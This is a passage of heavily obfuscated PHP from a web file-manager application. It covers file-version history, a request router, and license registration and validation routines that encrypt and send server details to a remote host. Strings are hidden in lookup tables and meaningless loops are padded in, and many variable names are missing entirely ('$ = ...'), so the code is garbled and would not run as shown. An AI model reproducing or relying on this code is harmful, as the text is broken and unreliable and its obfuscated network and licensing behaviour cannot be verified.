checkInHistory($훫) { $ = self::pathHistory($훫); if (!IO::exist($)) { $ .= $_SERVER[ʯ][1292]; } return IO::exist($) ? IO::info($) : !1; } private static function parsePath($) { $ޗ =& $_SERVER[ʯ]; if (!$) { return !1; } if ($GLOBALS[$ޗ[1293]]) { return; } $ = KodIO::parse($); $Ԣ = $[$ޗ[43]]; $߄ = !$Ԣ || $Ԣ == KodIO::KOD_IO || $Ԣ == KodIO::KOD_SHARE_ITEM; if (!$߄ || !$[$ޗ[1294]]) { return !1; } if (substr($, 0, strlen(DATA_PATH . $ޗ[1295])) == DATA_PATH . $ޗ[1295]) { return !1; } if ($Ԣ == KodIO::KOD_SHARE_ITEM) { $ = IO::init($); if ($->pathParse[$ޗ[1212]]) { return self::parsePath($->pathParse[$ޗ[1212]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ޗ[1296]); foreach ($ as $֝) { if (!$Ԣ && substr($, 0, strlen($֝)) == $֝) { return !1; } } self::log($GLOBALS[$ޗ[1207]] . $ޗ[1297] . $); return $; } private static function pathHistory($ƕ) { $ʱ =& $_SERVER[ʯ]; $׾ = self::$_historyBase . ltrim(KodIO::clear($ƕ), $ʱ[8]); $׾ = str_replace(array($ʱ[1298]), array($ʱ[1299]), $׾); return $׾; } public static function log($ꛂא) { } public static function historyCount($ˬҚ) { $܍ =& $_SERVER[ʯ]; $ƛ = array(); $濈 = array(); foreach ($ˬҚ as $χ) { $ଫ = get_path_father($χ); if (!$濈[$ଫ]) { $濈[$ଫ] = array(); } $濈[$ଫ][] = get_path_this($χ); } foreach ($濈 as $ଫ => $ݲ) { $؄ = self::parsePath($ଫ); if (!$؄) { continue; } foreach ($ݲ as $֮) { $Ü = self::listData(rtrim($؄, $܍[8]) . $܍[8] . $֮, !1); if ($Ü && $Ü[$܍[421]]) { $ƛ[rtrim($ଫ, $܍[8]) . $܍[8] . $֮] = count($Ü[$܍[421]]); } } } return $ƛ; } public static function add($ړ) { $ږ =& $_SERVER[ʯ]; $쟥 = self::listData($ړ); if (!$쟥) { return; } $ = Model($ږ[830])->get($ږ[1300]); $ = $GLOBALS[$ږ[6]][$ږ[99]][$ږ[1278]]; $ = $ == $ږ[1301] ? min(5, $) : $; if ($ <= 0) { return; } $ = IO::info($ړ); $­ = $쟥[$ږ[421]]; if ($[$ږ[86]] == 0) { return; } if ($[$ږ[86]] >= 1024 * 1024 * 500) { return !1; } $Ͷ = IO::hashSimple($ړ); if ($­ && $­[0][$ږ[648]] == $Ͷ) { return !0; } if (array_key_exists($ږ[226], $) && !$[$ږ[226]]) { return !1; } $ = short_id(time()); $Ʀ = array($ږ[451] => $, $ږ[648] => $Ͷ, $ږ[42] => $[$ږ[42]] . $ږ[10] . date($ږ[1302]) . rand_string(1), $ږ[86] => $[$ږ[86]], $ږ[503] => USER_ID, $ږ[224] => time(), $ږ[1303] => $ږ[12]); IO::mkdir($쟥[$ږ[1304]]); $ģʽ = IO::copy($ړ, $쟥[$ږ[1304]], !1, $Ʀ[$ږ[42]]); if (!$ģʽ) { self::clearEmptyFolder($쟥[$ږ[1304]]); return !1; } array_unshift($­, $Ʀ); if (count($­) > $) { $ = array_slice($­, $); foreach ($ as $) { IO::remove($쟥[$ږ[1304]] . $[$ږ[42]]); } $­ = array_slice($­, 0, $); } return self::saveData($쟥[$ږ[1305]], $­); } public static function remove($, $ɘ) { $ =& $_SERVER[ʯ]; $ = self::listData($); $ = array(); if (!$) { return !1; } foreach ($[$[421]] as $خ) { if ($خ[$[451]] == $ɘ) { IO::remove($[$[1304]] . $خ[$[42]]); continue; } $[] = $خ; } return self::saveData($[$[1305]], $); } public static function clear($, $գʒ = true) { $ü =& $_SERVER[ʯ]; $⏑ = self::listData($, $գʒ); if (!$⏑) { return !1; } foreach ($⏑[$ü[421]] as $ذ) { IO::remove($⏑[$ü[1304]] . $ذ[$ü[42]]); } return self::saveData($⏑[$ü[1305]], array()); } public static function moveHistory($, $ = '', $ߴ = '') { $ =& $_SERVER[ʯ]; $ʣ = self::listData($, !1); if (!$ʣ || !$ʣ[$[421]]) { return !1; } $ = $[1292]; $ = $ ? $ : get_path_this($); $ߴ = $ߴ ? $ߴ : $ʣ[$[1304]]; $ = substr(get_path_this($ʣ[$[1305]]), 0, -strlen($)); foreach ($ʣ[$[421]] as $ => $͛) { $߬ئ = $ . substr($͛[$[42]], strlen($)); $ȭ = IO::move($ʣ[$[1304]] . $͛[$[42]], $ߴ, !1, $߬ئ); if ($ȭ) { $ʣ[$[421]][$][$[42]] = $߬ئ; } } $ʣ[$[1305]] = IO::move($ʣ[$[1305]], $ߴ, !1, $ . $); self::saveData($ʣ[$[1305]], $ʣ[$[421]]); self::clearEmptyFolder($ʣ[$[1304]]); } public static function rollback($ԇ꩑, $ʏ) { $̐ =& $_SERVER[ʯ]; $샺 = self::listData($ԇ꩑); if (!$샺) { return; } $֌ = IO::info($ԇ꩑); foreach ($샺[$̐[421]] as $ާ => $) { if ($[$̐[451]] == $ʏ) { self::add($ԇ꩑); $־ = $샺[$̐[1304]] . $[$̐[42]]; $ו = IO::copy($־, IO::pathFather($ԇ꩑), REPEAT_REPLACE, $֌[$̐[42]]); if ($ו) { self::remove($ԇ꩑, $ʏ); } return $ו; } } return !1; } public static function setDetail($媢, $, $ܰы) { $ =& $_SERVER[ʯ]; $ܤ = self::listData($媢); if (!$ܤ) { return; } foreach ($ܤ[$[421]] as $ => $) { if ($[$[451]] == $) { $ܤ[$[421]][$][$[1303]] = $ܰы; self::saveData($ܤ[$[1305]], $ܤ[$[421]]); return !0; } } return !1; } public static function fileInfo($, $) { $ =& $_SERVER[ʯ]; $ԣ = self::listData($); if (!$ԣ) { show_json(LNG($[115]), !1); } $ԅ = $[12]; foreach ($ԣ[$[421]] as $ϔ؁ => $ϒ) { if ($ϒ[$[451]] != $) { continue; } $ԅ = $ԣ[$[1304]] . $ϒ[$[42]]; break; } if (!$ԅ) { show_json(LNG($[115]), !1); } return IO::info($ԅ); } public static function fileOut($ڪ, $, $ = false) { $ =& $_SERVER[ʯ]; $ = self::fileInfo($ڪ, $); $ =& $GLOBALS[$[7]]; $ = isset($[$[1255]]) && $[$[1255]] == 1; if (isset($[$[43]]) && $[$[43]] == $[1306]) { return IO::fileOutImage($[$[94]], $[$[1307]]); } IO::fileOut($[$[94]], $, get_path_this($ڪ)); } public static function listData($ʋ, $ΔΤ = true) { $ׁ =& $_SERVER[ʯ]; if ($ΔΤ && !IO::exist($ʋ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ʋ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $܋ = self::pathHistory($ʋ); $ݸ = array($ׁ[1305] => $܋ . $ׁ[1292], $ׁ[1304] => rtrim(get_path_father($܋), $ׁ[8]) . $ׁ[8], $ׁ[421] => array()); $ = IO::getContent($ݸ[$ׁ[1305]]); if ($) { $䡛 = json_decode($, !0); if (is_array($䡛)) { $ݸ[$ׁ[421]] = $䡛; } } return $ݸ; } private static function saveData($, $ߡ) { $ =& $_SERVER[ʯ]; self::log($[1308] . $ . $[81] . count($ߡ), $[811]); if ($ߡ) { return IO::setContent($, json_encode($ߡ)); } $͆ = IO::pathFather($); IO::remove($); self::clearEmptyFolder($͆); return !0; } public static function clearEmptyFolder($ޗĝ) { $ =& $_SERVER[ʯ]; if (trim($ޗĝ, $[8]) == trim(self::$_historyBase, $[8])) { return; } $ = IO::pathFather($ޗĝ); $饶ܴ = IO::has($ޗĝ, !0); if ($饶ܴ[$[232]] > 0 || $饶ܴ[$[233]] > 0) { return; } IO::remove($ޗĝ); self::clearEmptyFolder($); } private static function getBasePath() { $ڌݧ =& $_SERVER[ʯ]; $խ = Model($ڌݧ[1309])->get($ڌݧ[1310]); if ($խ) { if (!IO::exist($խ)) { IO::mkdir($խ); } if (get_path_this($խ) == $ڌݧ[1295]) { $ϲ = $ڌݧ[1311] . rand_string(8); @rename($խ, get_path_father($խ) . $ڌݧ[8] . $ϲ); $խ = DATA_PATH . $ϲ . $ڌݧ[8]; file_put_contents(DATA_PATH . $ڌݧ[1245], $ڌݧ[12]); Model($ڌݧ[1309])->set($ڌݧ[1310], $խ); } return $խ; } $խ = DATA_PATH . $ڌݧ[1311] . rand_string(8) . $ڌݧ[8]; $խ = IO::mkdir($խ); $խ = rtrim($խ, $ڌݧ[8]) . $ڌݧ[8]; file_put_contents($խ . $ڌݧ[1245], $ڌݧ[12]); file_put_contents(DATA_PATH . $ڌݧ[1245], $ڌݧ[12]); Model($ڌݧ[1309])->set($ڌݧ[1310], $խ); return $խ; } } goto bćυ; C: if (!$jucygqvtrz) { die; } class Application { private $defaultModule = "\151\x6e\x64\145\170"; private $defaultController = "\x69\x6e\x64\x65\x78"; private $defaultAction = "\x69\x6e\144\145\x78"; function __construct() { } public function setDefault($) { $ =& $_SERVER[ʯ]; $ɺ =& $_SERVER[ʌ]; $ = explode($ɺ[0], trim($, $ɺ[0])); $this->defaultModule = $[0] ? $[0] : $this->defaultModule; $ = $[660]; if (strlen($) < $[661]) { die; } $this->defaultController = $[1] ? $[1] : $this->defaultController; $î = $[662]; if (!$î) { return; } $this->defaultAction = $[2] ? $[2] : $this->defaultAction; $ى = $[663]; if (strlen($ى) < $[664]) { die; } $this->ojgn2ded7f6e($ɺ[1], array($this, $ɺ[2])); $ڭ = $[665]; while ($ڭ < $[661]) { if ($ڭ >= 0) { break; } $ڭ++; } } public function appRun($) { $ =& $_SERVER[ʯ]; $ =& $_SERVER[ʌ]; $ƃ = explode($[0], $); $ò = strtolower($ƃ[0]); $ߒð = $[666]; $ = $[3]; $ǽք = $[667]; if (!$ǽք) { die; } if ($ò == $[4]) { $ = $[5]; $ƃ[0] = $[6]; $ƃ[1] = $ƃ[1] . $[7]; $ = join($[0], $ƃ); $ = trim($, $[0]); } call_user_func(array($[8], $[9]), $ . $[10], $); ActionCall($); call_user_func(array($[8], $[9]), $ . $[11], $); $͸ = $[668]; if (!$͸) { return; } } private function autorun() { $ء =& $_SERVER[ʯ]; $콑 =& $_SERVER[ʌ]; global $config; $ = $ء[669]; while (strlen($) < $ء[19]) { if (!$) { break; } $++; } if (count($config[$콑[12]]) == 0) { return; } foreach ($config[$콑[12]] as $ֳ => $) { $this->appRun($); $ё = $ء[670]; while ($ё < $ء[19]) { if ($ё >= 0) { break; } $ё++; } } } private function wyka7e788d78() { $ =& $_SERVER[ʯ]; $䣧 =& $_SERVER[ʌ]; $ڀ = $䣧[4]; $̫ = $GLOBALS[$䣧[13]][$䣧[14]][0]; if (!$̫ || strlen($̫) <= strlen($ڀ)) { return; } if (strtolower(substr($̫, -strlen($ڀ))) != $ڀ) { return; } $調 = substr($̫, 0, -strlen($ڀ)); $ՙ = $[671]; if (strlen($ՙ) < $[672]) { die; } $Ŧ = array($䣧[4], $調); $ = array_slice($GLOBALS[$䣧[13]][$䣧[14]], 1); $GLOBALS[$䣧[13]][$䣧[14]] = array_merge($Ŧ, $); $ٷ = $[673]; while ($ٷ < $[664]) { if ($ٷ >= 0) { break; } $ٷ++; } $GLOBALS[$䣧[13]][$䣧[15]] = implode($䣧[0], $GLOBALS[$䣧[13]][$䣧[14]]); } private function tiqvf5e79ef6() { $ޠ =& $_SERVER[ʯ]; $ =& $_SERVER[ʌ]; if ($GLOBALS[$[13]][$[15]] != $[6]) { return; } $ = $_SERVER[$[16]]; $ = $[17]; if (!strstr($, $)) { return; } $钧 = strrpos($, $); $ū = $ޠ[674]; while (strlen($ū) < $ޠ[672]) { if (!$ū) { break; } $ū++; } $׶ = substr($, $钧 + strlen($)); $ = $ޠ[675]; preg_match_all($[18], $׶, $ޔ); $æ酈 = $ޠ[676]; if (strlen($æ酈) < $ޠ[672]) { return; } $׶ = trim($ޔ[0][0], $[19]); $ʰ = $ޠ[677]; if (strlen($ʰ) < $ޠ[672]) { return; } $GLOBALS[$[13]][$[14]] = explode($[19], $׶); $ = $ޠ[678]; while (strlen($) < $ޠ[661]) { if (!$) { break; } $++; } $GLOBALS[$[13]][$[15]] = implode($[0], $GLOBALS[$[13]][$[14]]); $ = $ޠ[679]; if (strlen($) < $ޠ[19]) { return; } } public function run() { $ =& $_SERVER[ʯ]; $ō =& $_SERVER[ʌ]; $this->tiqvf5e79ef6(); $Ɋ = $[680]; if (strlen($Ɋ) < $[681]) { return; } $this->wyka7e788d78(); $ = $GLOBALS[$ō[13]][$ō[14]]; $ = $[682]; if (!$) { return; } $á = $GLOBALS[$ō[13]][$ō[15]]; define($ō[20], isset($[0]) && $[0] ? $[0] : $this->defaultModule); $ = $[683]; while ($ < $[19]) { if ($ >= 0) { break; } $++; } define($ō[21], isset($[1]) && $[0] ? $[1] : $this->defaultController); define($ō[22], isset($[2]) && $[0] ? $[2] : $this->defaultAction); define($ō[23], MOD . $ō[0] . ST . $ō[0] . ACT); $Э = $[684]; if (strlen($Э) < $[661]) { die; } $_SERVER[$ō[24]] = strtolower(ACTION); $this->autorun(); $ލ֙ = $[685]; if (strlen($ލ֙) < $[661]) { die; } if (count($) >= 3) { $this->appRun($á); } else { $this->appRun(ACTION); } } private $abcl2d36ed8f = array(); private $nmqx22af2d5b = ''; public function lnax14788095() { $ =& $_SERVER[ʯ]; $਽ =& $_SERVER[ʌ]; $this->qahg73cc62ca(); $this->hcpzac45f6a7(); $this->azti2d53f10d(); $­ = $[686]; $this->emana5073ea8(); $Ѷ = $[687]; while ($Ѷ < $[19]) { if ($Ѷ >= 0) { break; } $Ѷ++; } $this->qymv65b2cedc(); $к = $[688]; if (!$к) { return; } $this->cmnac64fbae2(); $ = $[689]; while ($ < $[19]) { if ($ >= 0) { break; } $++; } $this->rluef92d63f9(); $䔕 = $[690]; if (strlen($䔕) < $[661]) { return; } $this->ojgn2ded7f6e($਽[25], array($this, $਽[26])); $this->ojgn2ded7f6e($਽[27], array($this, $਽[28])); $this->ojgn2ded7f6e($਽[29], array($this, $਽[30])); $ = $[691]; $this->ojgn2ded7f6e($਽[31], array($this, $਽[32])); $ө = $[692]; } public function qivb6e65a225($ƻ) { $ =& $_SERVER[ʯ]; $ʙ =& $_SERVER[ʌ]; $Ԫ = Model($ʙ[33])->get(); $ = $[693]; while (strlen($) < $[19]) { if (!$) { break; } $++; } $ = array($ʙ[34], $ʙ[35], $ʙ[36], $ʙ[37], $ʙ[38], $ʙ[39], $ʙ[40], $ʙ[41], $ʙ[42], $ʙ[43], $ʙ[44], $ʙ[45], $ʙ[46], $ʙ[47], $ʙ[48], $ʙ[49], $ʙ[50], $ʙ[51], $ʙ[52], $ʙ[53], $ʙ[54], $ʙ[55], $ʙ[56], $ʙ[57], $ʙ[58], $ʙ[59], $ʙ[60], $ʙ[61], $ʙ[62], $ʙ[63], $ʙ[64], $ʙ[65], $ʙ[66], $ʙ[67], $ʙ[68], $ʙ[69], $ʙ[70], $ʙ[71], $ʙ[72], $ʙ[73], $ʙ[74], $ʙ[75], $ʙ[76], $ʙ[77], $ʙ[78], $ʙ[79], $ʙ[80], $ʙ[81], $ʙ[82], $ʙ[83], $ʙ[84]); foreach ($ as $𱻍) { $ = $GLOBALS[$ʙ[85]][$ʙ[86]][$𱻍]; $ = $[694]; if (isset($Ԫ[$𱻍])) { $ = $Ԫ[$𱻍]; } $ƻ[$ʙ[87]][$ʙ[88]][$𱻍] = $; } $䲀 = $ƻ[$ʙ[87]][$ʙ[88]][$ʙ[46]]; $ = $[695]; if (strlen($) < $[681]) { die; } unset($ƻ[$ʙ[87]][$ʙ[89]][$ʙ[90]]); unset($ƻ[$ʙ[87]][$ʙ[89]][$ʙ[91]]); unset($ƻ[$ʙ[87]][$ʙ[88]][$ʙ[46]]); unset($ƻ[$ʙ[87]][$ʙ[88]][$ʙ[92]]); $ = $[696]; $ƻ[$ʙ[87]][$ʙ[88]][$ʙ[93]] = array($ʙ[94] => (int) $䲀[$ʙ[95]], $ʙ[96] => (int) _get($䲀, $ʙ[97], 0)); $ƻ[$ʙ[98]][$ʙ[99]] = Action($ʙ[100])->accessToken(); $Ѽ = $[697]; if (strlen($Ѽ) < $[672]) { return; } $ƻ[$ʙ[98]][$ʙ[101]] = md5($_SERVER[$ʙ[102]] . $Ԫ[$ʙ[103]]); $ї = $[698]; if (!$ї) { die; } $ƻ[$ʙ[98]][$ʙ[104]] = base64_encode(serverInfo()); $ƻ[$ʙ[98]][$ʙ[105]] = $this->nmqx22af2d5b; $ꤻ = $[699]; if (strlen($ꤻ) < $[19]) { return; } if ($Ԫ[$ʙ[105]] != $ʙ[106]) { $ƻ[$ʙ[98]][$ʙ[107]] = $Ԫ[$ʙ[107]]; $ƻ[$ʙ[98]][$ʙ[108]] = $Ԫ[$ʙ[108]]; $ = rand_string(10) . $this->nmqx22af2d5b . rand_string(5); $ƻ[$ʙ[87]][$ʙ[109]][$ʙ[110]] = $this->zxqi0f217a37($, $ƻ[$ʙ[98]][$ʙ[101]]); } if ($this->nmqx22af2d5b == $ʙ[106]) { $ƻ[$ʙ[87]][$ʙ[88]][$ʙ[93]][$ʙ[97]] = 0; } $ƻ[$ʙ[98]][$ʙ[111]] = _get($this->abcl2d36ed8f, $ʙ[112], $ʙ[6]); $ƻ[$ʙ[98]][$ʙ[113]] = _get($this->abcl2d36ed8f, $ʙ[114], $ʙ[6]); if (_get($GLOBALS, $ʙ[115]) && $this->config[$ʙ[116]]) { $ƻ[$ʙ[98]][$ʙ[117]] = WEB_ROOT; } return $ƻ; } private function cmnac64fbae2() { $ =& $_SERVER[ʯ]; $ =& $_SERVER[ʌ]; $Ӎ = $_SERVER[$[24]] == $[118]; $ߡ = $[700]; if (!$ߡ) { die; } if ($_SERVER[$[24]] == $[119] && $_GET[$[120]] == $[121]) { $Ӎ = !0; } if ($Ӎ) { $޹ = array($[105] => $this->nmqx22af2d5b, $[122] => $this->oelwa077c1cf(), $[123] => Model($[124])->count()); if ($this->nmqx22af2d5b != $[106]) { $ĩ = _get($this->abcl2d36ed8f, $[125]); if ($ĩ) { $޹[$[126]] = $ĩ; $޹[$[127]] = strtotime(_get($this->abcl2d36ed8f, $[128])); $޹[$[129]] = _get($this->abcl2d36ed8f, $[114]); } $ = Model($[33])->get($[130], $[6], !0); if (is_string($) && substr($, 0, 1) == $[131]) { $ = json_decode_force($); } if (is_array($) && $[$[132]] && strstr($[$[132]], $[133])) { $賓 = explode($[133], $[$[132]]); $޹[$[134]] = $賓[0]; } } $޹ = $this->orna6903f913(json_encode($޹), md5($[135])); $ = array($[136] => $޹); call_user_func(array($[137], $[138]), $); $ = $[701]; if (!$) { die; } } if ($this->nmqx22af2d5b == $[106]) { return; } $ʏ = array($[139], $[140], $[141], $[142], $[143], $[144]); $Ϙ = Model($[33])->get(); $ = array($[145] => $Ϙ[$[34]], $[146] => $Ϙ[$[35]], $[147] => $[6]); $ = $[702]; if (strlen($) < $[672]) { die; } foreach ($ʏ as $٩) { if (!isset($Ϙ[$٩]) || !$Ϙ[$٩]) { continue; } $[$٩] = $Ϙ[$٩]; $ƺ = $[703]; if (strlen($ƺ) < $[681]) { die; } } call_user_func(array($[137], $[138]), $); } private function emana5073ea8() { $隄 =& $_SERVER[ʯ]; $ߡ =& $_SERVER[ʌ]; if ($_SERVER[$ߡ[24]] != $ߡ[148]) { return; } if (!_get($GLOBALS, $ߡ[115])) { die; } $ = $GLOBALS[$ߡ[13]]; if (isset($[$ߡ[149]])) { $this->hery6097fc20(); die; } if (!isset($[$ߡ[150]]) || strlen($[$ߡ[150]]) != 16) { show_json($ߡ[151] . $[$ߡ[150]], !1); } $Ӱ = Model($ߡ[33])->get($ߡ[103]); $ = md5($_SERVER[$ߡ[102]] . $Ӱ); $ = $隄[704]; $İ = array($ߡ[150] => $[$ߡ[150]], $ߡ[152] => rand_string(16), $ߡ[153] => $ߡ[135], $ߡ[154] => $ߡ[155], $ߡ[156] => $_SERVER[$ߡ[157]], $ߡ[158] => $_SERVER[$ߡ[159]], $ߡ[160] => $_SERVER[$ߡ[161]], $ߡ[101] => $, $ߡ[162] => Model($ߡ[33])->get($ߡ[130])); $ = $隄[705]; if ($[$ߡ[163]] == $ߡ[164]) { $ں = $this->orna6903f913($, $ߡ[165]); $飥 = $this->zxqi0f217a37(json_encode($İ), $ . $ߡ[166], 3); $飥 = $飥 . $ߡ[167] . $_SERVER[$ߡ[157]]; $ߞ = $this->pdza1fd04e31($ߡ[168] . $ں . $ߡ[169] . $飥, -1); show_json($ߞ, !0); } else { if ($[$ߡ[163]] == $ߡ[170]) { $˙ = substr(md5($ߡ[171] . $), 12, 15) . $ߡ[172]; $飥 = $this->orkcbe9411e8(trim($[$ߡ[173]]), $˙, 2); $żͪ = json_decode($飥, !0); if (!is_array($żͪ) || !is_array($żͪ[$ߡ[174]]) || $żͪ[$ߡ[150]] != !0) { $ = $ߡ[175]; $ε = $żͪ[$ߡ[174]] ? $ߡ[176] . $żͪ[$ߡ[174]] : $; show_json($ε, !1); } else { $İ[$ߡ[152]] = $żͪ[$ߡ[174]][$ߡ[177]]; } } else { $żͪ = $this->pdza1fd04e31($ߡ[178], $İ, 10); } } if (!is_array($żͪ) || !is_array($żͪ[$ߡ[174]]) || $żͪ[$ߡ[150]] != !0) { $ = LNG($ߡ[179]); $ε = $żͪ[$ߡ[174]] ? $ߡ[176] . $żͪ[$ߡ[174]] : $; show_json($ε, !1); } $ꅅ = $żͪ[$ߡ[174]]; $񣨐 = $this->yodvbfafdb47($ꅅ[$ߡ[180]]); $ٍ = $隄[706]; while ($ٍ < $隄[661]) { if ($ٍ >= 0) { break; } $ٍ++; } if (!$񣨐 || $񣨐 != $ꅅ[$ߡ[128]]) { $ј = array($ߡ[181] => Model($ߡ[33])->get($ߡ[103]), $ߡ[182] => $_SERVER[$ߡ[102]], $ߡ[183] => this_url(), $ߡ[158] => $_SERVER[$ߡ[159]]); $飥 = $this->rmhb90fe2c27(json_encode($ј)); $this->pdza1fd04e31($ߡ[184] . $飥); show_json(LNG($ߡ[185]), !0); } $؞ = array($ߡ[186] => $ꅅ[$ߡ[187]], $ߡ[188] => $ꅅ[$ߡ[189]], $ߡ[190] => rand_string(16), $ߡ[105] => $ꅅ[$ߡ[191]]); if ($İ[$ߡ[152]]) { $؞[$ߡ[190]] = $İ[$ߡ[152]]; } $ = substr(md5($؞[$ߡ[188]]), 10, 10); $Ԭ = $ . $؞[$ߡ[105]] . $؞[$ߡ[190]]; $ = $隄[707]; while ($ < $隄[681]) { if ($ >= 0) { break; } $++; } $؞[$ߡ[107]] = strrev(base64_encode($this->orna6903f913($Ԭ, $ߡ[192]))); $ = $隄[708]; while (strlen($) < $隄[661]) { if (!$) { break; } $++; } $ = rand_string(16); $ˮࠕ = $ . $؞[$ߡ[105]] . $this->orna6903f913(md5($؞[$ߡ[186]]), $); $؞[$ߡ[108]] = base64_encode(strrev($this->orna6903f913($ˮࠕ, $ߡ[193]))); $ = $隄[709]; if ($ꅅ[$ߡ[194]] && $ꅅ[$ߡ[194]] >= 1) { Model($ߡ[33])->setDeep($ߡ[195], $ߡ[121]); } Model($ߡ[33])->set($؞); $ = md5($_SERVER[$ߡ[102]] . strrev($Ӱ) . $؞[$ߡ[188]]); $ʧ = $隄[710]; while (strlen($ʧ) < $隄[664]) { if (!$ʧ) { break; } $ʧ++; } $ؕ = strrev(substr($, 10, 16)); $ɲ = $隄[711]; if (strlen($ɲ) < $隄[661]) { return; } $掾 = $this->zxqi0f217a37(json_encode($ꅅ), $); $ = array_to_keyvalue(Model($ߡ[7])->listData(), $ߡ[196]); $Ǚ = $[$ߡ[197]]; $ئ = array(); $ = $隄[712]; if (strlen($) < $隄[19]) { return; } $ئ[$ؕ] = $掾; $ = $隄[713]; Model($ߡ[7])->update($Ǚ[$ߡ[198]], array($ߡ[199] => $ئ)); $܆ = $隄[714]; while (strlen($܆) < $隄[664]) { if (!$܆) { break; } $܆++; } $this->abcl2d36ed8f = $ꅅ; $˦ = $隄[715]; $this->nmqx22af2d5b = $؞[$ߡ[105]]; $this->licenseRegistSuccess(); Cache::set($ߡ[200] . md5($Ӱ . $ߡ[201]), $ߡ[6]); $ʕ = $隄[716]; if (strlen($ʕ) < $隄[661]) { return; } show_json(LNG($ߡ[185]), !0); } private function licenseRegistSuccess() { $ =& $_SERVER[ʯ]; $ߦڅ =& $_SERVER[ʌ]; $ = Model($ߦڅ[33])->get(); $ = $[717]; while (strlen($) < $[661]) { if (!$) { break; } $++; } if ($[$ߦڅ[63]] != $ߦڅ[121]) { Model($ߦڅ[33])->set($ߦڅ[63], $ߦڅ[121]); } Action($ߦڅ[202])->initStart(!0); } private function hery6097fc20() { $ =& $_SERVER[ʯ]; $ =& $_SERVER[ʌ]; Model($[33])->set(array($[186] => $[6], $[188] => $[6], $[105] => $[106], $[107] => $[6], $[108] => $[6])); $ = $[718]; if (!$) { return; } Model($[33])->setDeep($[195], $[203]); $ٯ͞ = $[719]; if (!$ٯ͞) { die; } $this->abcl2d36ed8f = array(); $this->nmqx22af2d5b = $[106]; $ŝ = $[720]; if (!$ŝ) { return; } } private function qahg73cc62ca() { $ʙ =& $_SERVER[ʯ]; $骺 =& $_SERVER[ʌ]; $_SERVER[$骺[159]] = _get($_SERVER, $骺[159], APP_HOST); $this->nmqx22af2d5b = $骺[106]; $ = $ʙ[721]; while (strlen($) < $ʙ[681]) { if (!$) { break; } $++; } $ն = Model($骺[33])->get(); $ = $ʙ[722]; if (strlen($) < $ʙ[672]) { return; } if ($ն[$骺[105]] == $骺[106]) { return; } $ = Model($骺[33])->get($骺[103]); $А = $骺[200] . md5($ . $骺[201]); $蓽 = $ʙ[723]; while ($蓽 < $ʙ[661]) { if ($蓽 >= 0) { break; } $蓽++; } $Ƈ = Cache::get($А); $ȝ = $ʙ[724]; if (!is_array($Ƈ) || !isset($Ƈ[$骺[204]]) || time() - $Ƈ[$骺[204]] >= 60) { $ٷې = Model($骺[7])->loadList(); $ĸ = $ٷې[$骺[197]]; $ = md5($_SERVER[$骺[102]] . strrev($) . $ն[$骺[188]]); $ǚڊ = strrev(substr($, 10, 16)); $Ƈ = $this->orkcbe9411e8($ĸ[$骺[85]][$ǚڊ], $); $Ƈ = json_decode($Ƈ, !0); } if (!is_array($Ƈ)) { return $this->hery6097fc20(); } $쐥 = strtotime($Ƈ[$骺[128]]); if (time() >= $쐥) { return $this->hery6097fc20(); } if (time() - $Ƈ[$骺[204]] > 20) { $Ƈ[$骺[204]] = time(); Cache::set($А, $Ƈ); } $this->abcl2d36ed8f = $Ƈ; $this->nmqx22af2d5b = $ն[$骺[105]]; $ڔ = $ʙ[725]; } private function hcpzac45f6a7() { $ =& $_SERVER[ʌ]; $ǭ = $GLOBALS[$[13]]; $ = $_SERVER[$[24]]; $̎޷ = $_SERVER[ʯ][726]; if ($ == $[205] && $this->nmqx22af2d5b == $[106]) { show_json(LNG($[206]), !1, $[207]); } $Ô = array($[208], $[209]); if (in_array($, $Ô)) { if ($this->nmqx22af2d5b == $[106] && isset($ǭ[$[210]])) { show_json(LNG($[206]), !1, $[207]); die; } $ۢ = $this->oelwa077c1cf(); if ($ۢ != intval($[211])) { if ($ۢ <= Model($[124])->count()) { show_json(LNG($[212]), !1, $[207]); die; } } } } private function azti2d53f10d() { $ƭ­ =& $_SERVER[ʯ]; $ =& $_SERVER[ʌ]; $ߍ = array($[118], $[119]); if (!_get($GLOBALS, $[115]) || !isset($_GET[$[213]])) { return; } if (!in_array($_SERVER[$[24]], $ߍ)) { return; } $섙̈́ = $[214]; $ = $ƭ­[727]; if (strlen($) < $ƭ­[681]) { die; } $섙̈́ = $this->glsb64d7e5b5($섙̈́, $[215]); $ߞ = $ƭ­[728]; if (!$ߞ) { die; } $Ѓ = stream_context_create(array($[216] => array($[217] => $[218], $[219] => 3))); $ = @file_get_contents($섙̈́, !1, $Ѓ); header($[220]); $ = $ƭ­[729]; if ($ && strstr($, $[221])) { echo $; } die; } public function rtjye624e4a2($ّń) { $򣪨 =& $_SERVER[ʯ]; $׺Ҕ =& $_SERVER[ʌ]; if ($this->nmqx22af2d5b == $׺Ҕ[222]) { return $ّń; } $ = array($׺Ҕ[223] => $׺Ҕ[224], $׺Ҕ[225] => $׺Ҕ[224], $׺Ҕ[226] => $׺Ҕ[224], $׺Ҕ[227] => $׺Ҕ[228], $׺Ҕ[229] => $׺Ҕ[228], $׺Ҕ[230] => $׺Ҕ[228], $׺Ҕ[231] => $׺Ҕ[228], $׺Ҕ[232] => $׺Ҕ[228], $׺Ҕ[233] => $׺Ҕ[228], $׺Ҕ[234] => $׺Ҕ[228], $׺Ҕ[235] => $׺Ҕ[228], $׺Ҕ[236] => $׺Ҕ[228], $׺Ҕ[237] => $׺Ҕ[228], $׺Ҕ[238] => $׺Ҕ[228], $׺Ҕ[239] => $׺Ҕ[228]); $˂ = explode($׺Ҕ[240], _get($this->abcl2d36ed8f, $׺Ҕ[112], $׺Ҕ[6])); $֜ = array(); $Ӷ̦ = $򣪨[730]; foreach ($ as $ => $ڒ) { if ($ڒ == $׺Ҕ[224] && substr($this->nmqx22af2d5b, 0, 1) == $׺Ҕ[224]) { continue; } if (!in_array($, $˂)) { $֜[] = $; } } foreach ($֜ as $) { unset($ّń[$]); $͡ = $򣪨[731]; while ($͡ < $򣪨[664]) { if ($͡ >= 0) { break; } $͡++; } } return $ّń; } private function rluef92d63f9() { $њ߷ =& $_SERVER[ʌ]; if ($this->nmqx22af2d5b != $њ߷[106]) { $GLOBALS[$њ߷[85]][$њ߷[89]][$њ߷[241]] = $њ߷[203]; return; } $GLOBALS[$њ߷[85]][$њ߷[242]] = $њ߷[121]; if (Model($њ߷[243])->get($њ߷[63]) != $њ߷[203]) { 